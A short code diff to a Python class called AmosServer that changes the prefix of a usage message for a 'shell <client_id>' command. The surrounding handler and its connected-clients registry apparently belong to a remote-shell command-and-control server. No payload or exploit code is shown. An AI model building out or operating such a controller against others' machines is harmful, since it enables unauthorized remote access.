@@ -112,7 +112,7 @@ class AmosServer:
 
                 elif base_cmd == "shell":
                     if len(parts) < 2:
-                        print("[-] Usage: shell <client_id>")
+                        print("[+] Usage: shell <client_id>")
                         continue
                     client_id = parts[1]
                     # Check if client exists in CONNECTED_CLIENTS (optional)
